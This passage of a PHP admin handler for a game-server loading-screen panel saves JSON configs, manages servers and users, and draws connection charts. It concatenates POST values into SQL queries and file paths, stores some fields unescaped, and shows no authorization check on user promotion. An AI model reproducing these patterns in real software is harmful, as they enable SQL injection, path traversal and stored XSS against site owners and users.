			"music" => array("https://www.youtube.com/watch?v=mmvqb9Uzu8k " => "Dumbfoundead - SAFE", "https://www.youtube.com/watch?v=R3_0Pky8vVg " => "Bohemian Rhapsody", "https://www.youtube.com/watch?v=IFUjwj_RB5o " => "Don't Stop Me Now"),
			"volume" => 50,
			"darkrpDB" => ''
		);
		$arrayToJson = json_encode($LSConfig);
		$createConfig = fopen(__DIR__.'/configs/'.$_POST['host'].'-'.$_POST['port'].'.json', 'w') or die('Permissions changed 532');
		fwrite($createConfig, $arrayToJson);
		fclose($createConfig);
	}

	if($_POST['type']=="editServer"){
		$editServer = $conn->prepare("UPDATE `theta_servers` SET `name` = ?, `ip` = ?, `port` = ?, `time` = ? WHERE `id` = ?");
		$editServer->execute(array($_POST['name'], $_POST['host'], $_POST['port'], time(), $_POST['server']));
	}

	if($_POST['type']=="deleteServer"){
		$findServer = $conn->query("SELECT * FROM `theta_servers` WHERE `id` = '".$_POST['sid']."'");
		if($findServer->rowCount()=="1"){
			$server = $findServer->fetch(PDO::FETCH_ASSOC);
			$getStats = $conn->query("SELECT * FROM `theta_stats` WHERE `server` = '".$_POST['sid']."'");
			while($r = $getStats->fetch(PDO::FETCH_ASSOC)){
				$updateStat = $conn->prepare("UPDATE `theta_stats` SET `server` = ? WHERE `id` = ?")->execute(array('0',$r['id']));
			}
			unlink(__DIR__.'/configs/'.$server['ip'].'.json');
			$deleteServer = $conn->query("DELETE FROM `theta_servers` WHERE `id` = '".$_POST['sid']."'");
		}
	}

	if($_POST['type']=="promoteUser"||$_POST['type']=="demoteUser"){
		$updateUser = $conn->prepare("UPDATE `theta_users` SET `staff` = ? WHERE `steamid` = ?")->execute(array($_POST['rank'],$_POST['steamid']));
	}

	if($_POST['type']=="saveConfig"){
		$s = theta::getServer($_POST['serverID']);
		$music = trim($_POST['music']);
		$music = explode("\n", $music);
		$musicA = array();
		foreach($music as $songz){
			$song = explode(' ', $songz);
			$musicA[$song[0]] = str_replace($song[0], '', $songz);
		}
		$LSConfig = array(
			"fontFamily" 				=> $_POST['fontFamily'],
			"titleImg"					=> htmlspecialchars($_POST['titleImg']),
			"titleImgHeight"		=> $_POST['titleImgHeight'],
			"title" 						=> $_POST['title'],
			"titleFontSize"			=> htmlspecialchars($_POST['titleFontSize']),
			"gametracker" 			=> htmlspecialchars($_POST['gametracker']),
			"mapImage" 					=> htmlspecialchars($_POST['mapImage']),
			"borderColor"				=> $_POST['borderColor'],
			"backgroundImage"		=> $_POST['backgroundImage'],
			"customMsg" 				=> htmlspecialchars($_POST['customMsg']),
			"customMsgAnswer" 	=> htmlspecialchars($_POST['customMsgAnswer']),
			"rules" 						=> htmlspecialchars($_POST['rules']),
			"animation" 				=> htmlspecialchars($_POST['animation']),
			"aboutTitle" 				=> $_POST['aboutTitle'],
			"aboutUs" 					=> htmlspecialchars($_POST['aboutUs']),
			"music" 						=> $musicA,
			"volume"						=> $_POST['volume'],
			"darkrpDB"					=> htmlspecialchars($_POST['darkrpDB'])
		);
		$arrayToJson = json_encode($LSConfig);
		$createConfig = fopen(__DIR__.'/configs/'.$s[1].'-'.$s[2].'.json', 'w') or die('Permissions changed 531');
		fwrite($createConfig, $arrayToJson);
		fclose($createConfig);
	}

	if($_POST['type'] == "specServerStats"){
		(!isset($_POST['date'])?$_POST['date'] = '08/01/2016 12:00 AM':'');
		$date = strtotime($_POST['date']);
		$checkServer = $conn->query("SELECT * FROM `theta_servers` ORDER BY `time`");
		if($checkServer->rowCount() > 0){
			while($r = $checkServer->fetch(PDO::FETCH_ASSOC)){ $data=theta::customWeek($date, $r['id']); $uData=theta::customWeek($date, $r['id'], 1); ?>
				<div class="col-md-6">
					<p><?= $r['name'] ?></p>
					<canvas id="dateConn<?= $r['id'] ?>"></canvas>
					<script type="text/javascript">
						var days = ['<?= $data['days'][0] ?>','<?= $data['days'][1] ?>','<?= $data['days'][2] ?>','<?= $data['days'][3] ?>','<?= $data['days'][4] ?>','<?= $data['days'][5] ?>','<?= $data['days'][6] ?>'];
						var dateConn<?= $r['id'] ?> = document.getElementById("dateConn<?= $r['id'] ?>");
						var connectionChart = new Chart(dateConn<?= $r['id'] ?>, {
						    type: 'bar',
						    data: {
						        labels: days,
						        datasets: [{
						        	label: 'Connections',
						            data: [<?= $data['counts'][0] ?>, <?= $data['counts'][1] ?>, <?= $data['counts'][2] ?>, <?= $data['counts'][3] ?>, <?= $data['counts'][4] ?>, <?= $data['counts'][5] ?>, <?= $data['counts'][6] ?>],
						            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
						            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
						            borderWidth: 1
						        },
						        {
						        	label: 'Unique connections',
						            data: [<?= $uData['counts'][0] ?>, <?= $uData['counts'][1] ?>, <?= $uData['counts'][2] ?>, <?= $uData['counts'][3] ?>, <?= $uData['counts'][4] ?>, <?= $uData['counts'][5] ?>, <?= $uData['counts'][6] ?>],
						            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
						            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
						            borderWidth: 1
						        }]
						    },options: {legend: {display: false},scales: {yAxes: [{ticks: {beginAtZero:true}}]}}
						});
					</script>
				</div>
			<?php } ?>
			<div class="col-md-6">
				<?php
					$data=theta::customWeek($date, 0, 0, 1); $uData=theta::customWeek($date, 0, 1, 1);
				?>
				<p>Unassigned server data</p>
				<canvas id="specConn"></canvas>
				<script type="text/javascript">
					var days = ['<?= $data['days'][0] ?>','<?= $data['days'][1] ?>','<?= $data['days'][2] ?>','<?= $data['days'][3] ?>','<?= $data['days'][4] ?>','<?= $data['days'][5] ?>','<?= $data['days'][6] ?>'];
					var specConn = document.getElementById("specConn");
					var connectionChart = new Chart(specConn, {
					    type: 'bar',
					    data: {
					        labels: days,
					        datasets: [{
					        	label: 'Connections',
					            data: [<?= $data['counts'][0] ?>, <?= $data['counts'][1] ?>, <?= $data['counts'][2] ?>, <?= $data['counts'][3] ?>, <?= $data['counts'][4] ?>, <?= $data['counts'][5] ?>, <?= $data['counts'][6] ?>],
					            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
					            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
					            borderWidth: 1
					        },
					        {
					        	label: 'Unique connections',
					            data: [<?= $uData['counts'][0] ?>, <?= $uData['counts'][1] ?>, <?= $uData['counts'][2] ?>, <?= $uData['counts'][3] ?>, <?= $uData['counts'][4] ?>, <?= $uData['counts'][5] ?>, <?= $uData['counts'][6] ?>],
					            backgroundColor: ['rgba(255, 99, 132, 0.2)','rgba(54, 162, 235, 0.2)','rgba(255, 206, 86, 0.2)','rgba(75, 192, 192, 0.2)','rgba(153, 102, 255, 0.2)','rgba(255, 159, 64, 0.2)','rgba(53, 51, 221, 0.2)'],
					            borderColor: ['rgba(255,99,132,1)','rgba(54, 162, 235, 1)','rgba(255, 206, 86, 1)','rgba(75, 192, 192, 1)','rgba(153, 102, 255, 1)','rgba(255, 159, 64, 1)','rgb(53, 51, 221)'],
					            borderWidth: 1
					        }]
					    },options: {legend: {display: false},scales: {yAxes: [{ticks: {beginAtZero:true}}]}}
					});
				</script>
			</div>
		</div>
		<?php } else { ?>
			<div class="alert alert-info text-center" style="margin-bottom:0"><i class="glyphicon glyphicon-info-sign"></i> No server specific statistics detected...</div>
		</div>
		<?php }
	}
}

if(!isset($_GET['type']) && !isset($_POST['type']) || empty($_SERVER['HTTP_X_REQUESTED_WITH']) || strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) !== 'xmlhttprequest'){
	echo 'go fuck yourself';
}
